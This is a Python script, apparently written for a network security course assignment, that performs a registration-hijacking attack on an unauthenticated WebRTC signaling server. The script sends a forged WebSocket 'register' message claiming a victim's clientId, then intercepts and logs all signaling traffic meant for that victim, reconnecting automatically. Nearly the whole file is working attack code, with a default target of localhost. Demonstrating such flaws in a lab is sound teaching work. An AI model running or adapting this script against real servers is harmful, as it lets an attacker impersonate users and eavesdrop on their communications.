#!/usr/bin/env python3
"""
attacker.py

Registration hijacking attack against the WebRTC signaling server.

This script connects to the signaling server WebSocket endpoint and
sends a forged "register" message using a victim's clientId (e.g. "client-a").
Because the signaling server does not implement any authentication
or authorization, the server will accept this registration and bind
the victim's clientId to the attacker's WebSocket connection.

As a result, any future signaling messages that the server routes
to the victim (messages with "to": "<victim-id>") will be delivered
to the attacker's program instead. The attacker can then observe and
log all intercepted messages.

Key properties of this implementation:
- Written in Python using the "websockets" asynchronous client library.
- Configurable via command-line arguments:
  * --server-url  : WebSocket URL of the signaling server
  * --victim-id   : clientId to impersonate (e.g., "client-a")
  * --display-name: displayName reported in the meta field (optional)
  * --log-file    : path to a log file or "-" for stdout only
- Logs both raw WebSocket messages and pretty-printed JSON (when possible).
- Handles connection errors gracefully and attempts automatic reconnects.
- Intended strictly for educational use in the context of the NS assignment.
"""

import argparse
import asyncio
import json
from datetime import datetime
from typing import Optional

import websockets


def timestamp_utc() -> str:
    """
    Return a human-readable UTC timestamp string.

    We use ISO 8601 format with seconds precision so:
      - It is easy to read in logs.
      - It can be sorted lexicographically.
    """
    return datetime.utcnow().isoformat(timespec="seconds") + "Z"


def log(message: str, log_file: Optional[str]) -> None:
    """
    Log a single line with a UTC timestamp to stdout and optionally to a file.

    Parameters
    ----------
    message : str
        The message to log. This function does not append a timestamp itself;
        instead, it prefixes the message with the current UTC timestamp.

    log_file : Optional[str]
        Path to a log file (e.g., "attacker.log"), or None if no file logging
        is desired. If log_file is "-", the caller should already have passed
        None instead, so here we only check for None vs non-None.

    Behavior
    --------
    - Always prints to stdout.
    - If log_file is not None, appends the same line to the given file.
    """
    line = f"[{timestamp_utc()}] {message}"
    print(line)

    if log_file is not None:
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except OSError as e:
            # We do not raise here; the primary output (stdout) still works.
            # We log the file error once to stdout so the operator can notice.
            print(f"[{timestamp_utc()}] [!] Failed to write to log file "
                  f"{log_file!r}: {e!r}")


async def send_registration(
    ws: websockets.WebSocketClientProtocol,
    victim_id: str,
    display_name: str,
    log_file: Optional[str],
) -> None:
    """
    Send a forged registration message to the signaling server.

    Parameters
    ----------
    ws : websockets.WebSocketClientProtocol
        An open WebSocket connection to the signaling server.

    victim_id : str
        The clientId that we want to impersonate. For example, "client-a".
        This is the critical part of the attack: we claim this identity.

    display_name : str
        Value for meta.displayName in the registration message.
        This is not security-sensitive (the server does not verify it),
        but it can be useful to distinguish attacker registrations in logs.

    log_file : Optional[str]
        Optional path to a log file for logging messages.

    Behavior
    --------
    Constructs a JSON object that matches the registration format seen in
    the captured traffic:

      {
        "type": "register",
        "clientId": "<victim-id>",
        "meta": {
          "displayName": "<some-name>"
        }
      }

    Then serializes it to a JSON string and sends it over the WebSocket.
    """
    registration_message = {
        "type": "register",
        "clientId": victim_id,
        "meta": {
            "displayName": display_name,
        },
    }

    raw = json.dumps(registration_message)
    log(f"[C → S] Registration message (impersonating {victim_id!r}): {raw}", log_file)

    # This is the moment we actually perform the hijacking attempt:
    # if the server accepts this message, it will associate `victim_id`
    # with our WebSocket connection.
    await ws.send(raw)


async def listen_and_log(
    ws: websockets.WebSocketClientProtocol,
    log_file: Optional[str],
) -> None:
    """
    Listen for incoming messages from the signaling server and log them.

    Parameters
    ----------
    ws : websockets.WebSocketClientProtocol
        An open WebSocket connection to the signaling server.

    log_file : Optional[str]
        Optional path to a log file for logging messages.

    Behavior
    --------
    - Continuously reads messages from the server using "async for".
    - For each message:
      * Logs the raw WebSocket payload.
      * Attempts to parse it as JSON and pretty-print with indentation.
        If parsing fails, logs that the payload is non-JSON.

    This function does not return under normal operation; it only returns
    when the server closes the connection or an exception occurs.
    """
    async for raw in ws:
        # Log the raw message as-is, exactly what was received.
        log(f"[S → C] Raw message: {raw}", log_file)

        # Try to parse the raw string as JSON to provide a nicer view.
        try:
            data = json.loads(raw)
        except json.JSONDecodeError:
            # The signaling server is expected to send JSON, but we still
            # defend against malformed or unexpected data.
            log("[S → C] Failed to parse message as JSON (non-JSON payload).", log_file)
            continue

        pretty = json.dumps(data, indent=2, sort_keys=True)
        log("[S → C] JSON message (pretty-printed):\n" + pretty, log_file)


async def run_attack(
    server_url: str,
    victim_id: str,
    display_name: str,
    log_file: Optional[str],
    reconnect_delay: float = 3.0,
) -> None:
    """
    Orchestrate the registration hijacking attack and handle reconnections.

    Parameters
    ----------
    server_url : str
        WebSocket URL of the signaling server. For example:
        - "ws://localhost:8080" (direct server)
        - "ws://localhost:8081" (through your proxy, if used)

    victim_id : str
        clientId to impersonate (e.g., "client-a").

    display_name : str
        displayName placed in the "meta" object of the registration message.
        This only affects how we appear in logs; it does not influence
        the server's routing of messages.

    log_file : Optional[str]
        Optional path to a log file for logging messages. If None, only
        stdout is used.

    reconnect_delay : float, optional
        Number of seconds to wait before attempting to reconnect after a
        connection-related error. A small delay prevents tight reconnection
        loops if the server is unavailable.

    Behavior
    --------
    - Logs initial configuration.
    - Enters an infinite loop:
      * Attempts to connect to the signaling server.
      * On success:
        + Sends the registration message (impersonation).
        + Starts listening to and logging all messages.
      * If the connection fails or is closed:
        + Logs the error / closure.
        + Sleeps for reconnect_delay seconds.
        + Tries again.

    The loop only stops when the entire program is stopped (e.g., via
    Ctrl+C, which cancels the asyncio event loop).
    """
    log(
        f"[*] Starting registration hijacking attack: "
        f"server={server_url!r}, victim_id={victim_id!r}, "
        f"display_name={display_name!r}",
        log_file,
    )

    # Outer loop that supports automatic reconnects.
    while True:
        try:
            log(f"[*] Connecting to signaling server at {server_url!r} ...", log_file)

            # Establish a new WebSocket connection to the signaling server.
            async with websockets.connect(server_url) as ws:
                log("[+] Connected to signaling server.", log_file)

                # Immediately send the forged registration message.
                await send_registration(ws, victim_id, display_name, log_file)

                # Now that we are "registered" as the victim, any messages
                # intended for that clientId should be delivered to us.
                # We simply listen and log everything.
                log("[*] Waiting for messages (intercepting traffic) ...", log_file)
                await listen_and_log(ws, log_file)

            # If we exit the "async with" context without an exception,
            # it means the server closed the connection gracefully.
            log("[*] Connection closed by server. Will attempt to reconnect.", log_file)

        except (websockets.exceptions.ConnectionClosedError,
                websockets.exceptions.InvalidStatusCode,
                OSError) as e:
            # These exceptions typically indicate network-level issues
            # or that the server is temporarily unavailable.
            log(f"[!] Connection error: {e!r}", log_file)

        except asyncio.CancelledError:
            # This exception is raised when the asyncio task is cancelled,
            # which happens when the application is shutting down.
            log("[!] Attack task cancelled, exiting run_attack().", log_file)
            break

        # Wait a bit before reattempting the connection. This prevents
        # hammering the server in case it is down or misconfigured.
        log(f"[*] Reconnecting in {reconnect_delay} seconds ...", log_file)
        await asyncio.sleep(reconnect_delay)


def parse_args() -> argparse.Namespace:
    """
    Parse command-line arguments for the attacker script.

    Returns
    -------
    argparse.Namespace
        An object with attributes corresponding to the defined arguments:
        - server_url   : str
        - victim_id    : str
        - display_name : Optional[str]
        - log_file     : str
    """
    parser = argparse.ArgumentParser(
        description=(
            "Registration hijacking attacker for the WebRTC signaling server. "
            "Connects to a signaling WebSocket endpoint and registers using a "
            "victim's clientId, then logs all intercepted messages."
        )
    )

    parser.add_argument(
        "--server-url",
        default="ws://localhost:8080",
        help=(
            "WebSocket URL of the signaling server. "
            "Default: ws://localhost:8080"
        ),
    )

    parser.add_argument(
        "--victim-id",
        required=True,
        help=(
            "clientId to impersonate (e.g. 'client-a'). "
            "This is the identity that will be hijacked."
        ),
    )

    parser.add_argument(
        "--display-name",
        default=None,
        help=(
            "displayName to use in the registration meta field. "
            "If omitted, a default of the form 'attacker-<victim-id>' is used."
        ),
    )

    parser.add_argument(
        "--log-file",
        default="attacker.log",
        help=(
            "Path to a log file. Default: attacker.log. "
            "Pass '-' to disable file logging and only log to stdout."
        ),
    )

    return parser.parse_args()


def main() -> None:
    """
    Entry point for the attacker script.

    - Parses command-line arguments.
    - Sets up the display name and log file behavior.
    - Starts the asyncio event loop and runs the attack coroutine.

    This function is designed so that the instructor can execute the attack
    with a single command, for example:

        python attacker.py --victim-id client-a

    or, if using the WebSocket proxy on port 8081:

        python attacker.py --server-url ws://localhost:8081 --victim-id client-a
    """
    args = parse_args()

    # If the user did not specify a display name, we generate a helpful default
    # that clearly indicates this is an attacker instance tied to a victim id.
    display_name = args.display_name or f"attacker-{args.victim_id}"

    # If the user passes "-", we interpret it as "no file logging" and rely
    # only on stdout. This is useful when running the script in environments
    # where writing to local disk is inconvenient.
    log_file: Optional[str]
    if args.log_file == "-":
        log_file = None
    else:
        log_file = args.log_file

    try:
        asyncio.run(
            run_attack(
                server_url=args.server_url,
                victim_id=args.victim_id,
                display_name=display_name,
                log_file=log_file,
            )
        )
    except KeyboardInterrupt:
        # This handles a Ctrl+C during the outermost execution. The event loop
        # is already stopped by asyncio.run(); here we simply print a final
        # message to make it clear that the termination was intentional.
        print(f"[{timestamp_utc()}] [!] KeyboardInterrupt received, exiting.")


if __name__ == "__main__":
    main()
